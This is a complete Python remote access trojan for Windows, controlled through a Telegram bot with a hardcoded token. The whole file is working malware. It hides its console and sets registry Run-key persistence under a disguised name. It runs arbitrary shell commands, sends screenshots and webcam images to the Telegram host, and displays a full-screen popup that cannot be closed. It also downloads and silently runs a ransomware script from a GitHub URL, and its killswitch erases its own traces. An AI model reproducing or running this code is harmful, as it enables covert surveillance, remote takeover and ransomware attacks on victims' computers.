# RAT_script.py - Full working script with all commands, fixed bugs, and killswitch
# Upload to: https://raw.githubusercontent.com/Hehehasmr/mathpython/refs/heads/main/RAT_script.py

import os
import sys
import subprocess
import threading
import time
import requests
import json
import ctypes
import winreg
import tempfile
import urllib.request
from datetime import datetime
from PIL import ImageGrab
import io

# Try to import optional modules
try:
    import cv2
    CV2_AVAILABLE = True
except:
    CV2_AVAILABLE = False

try:
    import tkinter as tk
    TKINTER_AVAILABLE = True
except:
    TKINTER_AVAILABLE = False

# --- CONFIG ---
BOT_TOKEN = "8755658192:AAEEkXaihdEPyTRbj33bVt_-9ckubS2uiDA"
CHAT_ID = "7894519456"
BASE_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"
RANSOMWARE_URL = "https://raw.githubusercontent.com/Hehehasmr/mathpython/refs/heads/main/ransomeware1.py"
STATE_FILE = os.path.join(tempfile.gettempdir(), ".telegram_offset.dat")

# --- State Management ---
def load_offset():
    try:
        with open(STATE_FILE, 'r') as f:
            return int(f.read().strip())
    except:
        return 0

def save_offset(offset):
    try:
        with open(STATE_FILE, 'w') as f:
            f.write(str(offset))
    except:
        pass

def reset_offset():
    """Reset command state - forces re-read of all commands"""
    try:
        if os.path.exists(STATE_FILE):
            os.remove(STATE_FILE)
    except:
        pass
    try:
        resp = requests.get(f"{BASE_URL}/getUpdates", timeout=10)
        data = resp.json()
        if data.get("ok") and data.get("result"):
            latest = data["result"][-1]["update_id"] + 1
            save_offset(latest)
            return latest
    except:
        pass
    return 0

# --- Persistence ---
def install_persistence():
    try:
        script_path = os.path.abspath(sys.argv[0])
        if script_path.endswith('.py'):
            cmd = f'"{sys.executable}" "{script_path}"'
        else:
            cmd = f'"{script_path}"'
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(handle, "WindowsSystemHealth", 0, winreg.REG_SZ, cmd)
        winreg.CloseKey(handle)
    except:
        pass

# --- Restart ---
def restart_self():
    try:
        script = os.path.abspath(sys.argv[0])
        if script.endswith('.py'):
            subprocess.Popen([sys.executable, script], creationflags=subprocess.CREATE_NO_WINDOW,
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        else:
            subprocess.Popen([script], creationflags=subprocess.CREATE_NO_WINDOW,
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        pass

# --- Telegram Functions ---
def send_message(text):
    try:
        requests.post(f"{BASE_URL}/sendMessage", data={"chat_id": CHAT_ID, "text": text}, timeout=10)
    except:
        pass

def send_photo(photo_bytes):
    try:
        files = {"photo": photo_bytes}
        requests.post(f"{BASE_URL}/sendPhoto", data={"chat_id": CHAT_ID}, files=files, timeout=15)
    except:
        pass

def get_ip():
    try:
        return requests.get("https://api.ipify.org", timeout=5).text
    except:
        return "Unable to fetch IP"

# --- KILLSWITCH ---
def kill_all_and_clean():
    """Emergency kill - stops everything and removes traces"""
    try:
        # Send death message
        try:
            send_message("💀 KILLSWITCH ACTIVATED. Terminating and cleaning...")
        except:
            pass
        
        # 1. Kill all Python processes
        os.system("taskkill /f /im python.exe >nul 2>&1")
        os.system("taskkill /f /im python3.exe >nul 2>&1")
        os.system("taskkill /f /im cmd.exe >nul 2>&1")
        os.system("taskkill /f /im conhost.exe >nul 2>&1")
        os.system("taskkill /f /im powershell.exe >nul 2>&1")
        
        # 2. Delete the RAT script itself
        try:
            os.remove(os.path.abspath(sys.argv[0]))
        except:
            pass
        
        # 3. Delete all temp files
        os.system(f"del /f /q {tempfile.gettempdir()}\\*.py >nul 2>&1")
        os.system(f"del /f /q {tempfile.gettempdir()}\\*.tmp >nul 2>&1")
        os.system(f"del /f /q {tempfile.gettempdir()}\\*health* >nul 2>&1")
        os.system(f"del /f /q {tempfile.gettempdir()}\\*update* >nul 2>&1")
        os.system(f"del /f /q {tempfile.gettempdir()}\\*heartbeat* >nul 2>&1")
        os.system(f"del /f /q {tempfile.gettempdir()}\\*ransomware* >nul 2>&1")
        
        # 4. Remove registry keys
        os.system("reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsSystemHealth /f >nul 2>&1")
        os.system("reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsSecurityUpdate /f >nul 2>&1")
        os.system("reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce /v WindowsSecurityUpdate /f >nul 2>&1")
        
        # 5. Delete state file
        try:
            if os.path.exists(STATE_FILE):
                os.remove(STATE_FILE)
        except:
            pass
        
        # 6. Delete scheduled tasks
        os.system("schtasks /delete /tn DeleteRAT /f >nul 2>&1")
        os.system("schtasks /delete /tn WindowsSecurityUpdate /f >nul 2>&1")
        os.system("schtasks /delete /tn WindowsSystemHealth /f >nul 2>&1")
        
        # 7. Flush DNS
        os.system("ipconfig /flushdns >nul 2>&1")
        
        # 8. Exit
        sys.exit(0)
        
    except:
        sys.exit(0)

# --- Command Execution ---
def execute_command(cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        output = result.stdout + result.stderr
        if len(output) > 4000:
            output = output[:4000] + "...\n[truncated]"
        return output if output.strip() else "Command executed (no output)"
    except subprocess.TimeoutExpired:
        return "Command timed out after 30 seconds"
    except Exception as e:
        return f"Error: {str(e)}"

# --- Webcam ---
def capture_webcam():
    if not CV2_AVAILABLE:
        return None
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return None
        ret, frame = cap.read()
        cap.release()
        if not ret:
            return None
        _, buf = cv2.imencode('.jpg', frame)
        return io.BytesIO(buf.tobytes())
    except:
        return None

# --- Screenshot ---
def send_screenshot():
    try:
        img = ImageGrab.grab()
        buf = io.BytesIO()
        img.save(buf, format="PNG")
        buf.seek(0)
        send_photo(buf)
    except Exception as e:
        send_message(f"Screenshot failed: {str(e)[:50]}")

def send_ip():
    ip = get_ip()
    send_message(f"IP Address: {ip}")

def execute_and_send(cmd):
    output = execute_command(cmd)
    send_message(f"Command: {cmd}\nOutput:\n{output}")

def send_webcam():
    if not CV2_AVAILABLE:
        send_message("Webcam not available - OpenCV not installed")
        return
    try:
        img_bytes = capture_webcam()
        if img_bytes:
            send_photo(img_bytes)
        else:
            send_message("Webcam capture failed - no camera or access denied")
    except Exception as e:
        send_message(f"Webcam error: {str(e)[:50]}")

# --- Flashing Popup ---
def show_flashing_popup(message_text):
    if not TKINTER_AVAILABLE:
        send_message("Popup not available - tkinter not installed")
        return
    try:
        root = tk.Tk()
        root.title("SYSTEM ALERT")
        root.geometry("800x600")
        root.attributes('-topmost', True)
        root.attributes('-fullscreen', True)
        root.configure(bg='black')
        label = tk.Label(root, text=message_text, font=("Arial", 48, "bold"),
                        fg='red', bg='black', wraplength=750)
        label.pack(expand=True, fill=tk.BOTH)
        count_label = tk.Label(root, text="7", font=("Arial", 72, "bold"),
                              fg='white', bg='black')
        count_label.pack(pady=20)
        root.protocol("WM_DELETE_WINDOW", lambda: None)
        def flash():
            colors = ['red', 'yellow', 'cyan', 'magenta', 'lime', 'orange', 'white']
            for i in range(25):
                try:
                    label.config(fg=colors[i % len(colors)])
                    root.update()
                    time.sleep(0.12)
                except:
                    break
        def countdown():
            for i in range(7, 0, -1):
                try:
                    count_label.config(text=str(i))
                    root.update()
                    time.sleep(1)
                except:
                    break
            try:
                root.destroy()
            except:
                pass
        threading.Thread(target=flash, daemon=True).start()
        countdown()
        root.mainloop()
    except:
        pass

# --- Ransomware ---
def trigger_ransomware():
    send_message("Downloading and executing ransomware...")
    try:
        target = os.path.join(tempfile.gettempdir(), "ransomware_worker.py")
        urllib.request.urlretrieve(RANSOMWARE_URL, target)
        if sys.platform == "win32":
            startup = subprocess.STARTUPINFO()
            startup.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            subprocess.Popen([sys.executable, target], startupinfo=startup,
                           creationflags=subprocess.CREATE_NO_WINDOW,
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        else:
            subprocess.Popen([sys.executable, target],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        send_message("Ransomware deployed successfully")
    except Exception as e:
        send_message(f"Ransomware failed: {str(e)[:100]}")

# --- Heartbeat ---
def heartbeat_monitor():
    heartbeat_file = os.path.join(tempfile.gettempdir(), ".sys_heartbeat.tmp")
    while True:
        try:
            with open(heartbeat_file, 'w') as f:
                f.write(str(time.time()))
            time.sleep(10)
        except:
            pass

# --- Main Handler ---
def handle_updates(offset):
    try:
        resp = requests.get(f"{BASE_URL}/getUpdates", params={"offset": offset, "timeout": 30}, timeout=35)
        data = resp.json()
        if data.get("ok"):
            for update in data.get("result", []):
                new_offset = update.get("update_id", 0) + 1
                msg = update.get("message", {})
                if "text" in msg:
                    text = msg["text"].strip()
                    lower = text.lower()
                    
                    # --- KILLSWITCH ---
                    if lower == "/killswitch" or lower == "/selfdestruct" or lower == "/emergencystop":
                        threading.Thread(target=kill_all_and_clean).start()
                        return new_offset
                    
                    # --- RESET ---
                    if lower == "/reset":
                        reset_offset()
                        send_message("✅ Commands reset. All previous commands ignored.")
                        return new_offset
                    
                    # --- NORMAL COMMANDS ---
                    if lower == "/screenshot":
                        threading.Thread(target=send_screenshot).start()
                    
                    elif lower.startswith("/message "):
                        parts = text.split(" ", 1)
                        if len(parts) > 1:
                            threading.Thread(target=show_flashing_popup, args=(parts[1],)).start()
                            send_message(f"Popup shown: {parts[1]}")
                        else:
                            send_message("Usage: /message <text>")
                    
                    elif lower == "/ip":
                        threading.Thread(target=send_ip).start()
                    
                    elif lower.startswith("/command "):
                        parts = text.split(" ", 1)
                        if len(parts) > 1:
                            threading.Thread(target=execute_and_send, args=(parts[1],)).start()
                        else:
                            send_message("Usage: /command <cmd>")
                    
                    elif lower == "/webcam":
                        threading.Thread(target=send_webcam).start()
                    
                    elif lower == "/ransomware":
                        threading.Thread(target=trigger_ransomware).start()
                    
                return new_offset
    except:
        pass
    return offset

# --- Main Loop ---
def main_loop():
    ip = get_ip()
    hostname = os.environ.get("COMPUTERNAME", "Unknown")
    send_message(f"✅ Connected | Host: {hostname} | IP: {ip}")
    
    install_persistence()
    
    heartbeat_thread = threading.Thread(target=heartbeat_monitor, daemon=True)
    heartbeat_thread.start()
    
    offset = load_offset()
    while True:
        try:
            new_offset = handle_updates(offset)
            if new_offset != offset:
                offset = new_offset
                save_offset(offset)
            time.sleep(2)
        except Exception as e:
            send_message(f"Loop error: {str(e)[:100]}")
            time.sleep(5)
            restart_self()
            sys.exit(0)

# --- Entry ---
if __name__ == "__main__":
    if sys.platform == "win32":
        try:
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass
    
    try:
        main_loop()
    except Exception as e:
        try:
            send_message(f"Fatal: {str(e)[:100]}")
        except:
            pass
        time.sleep(3)
        restart_self()
        sys.exit(0)
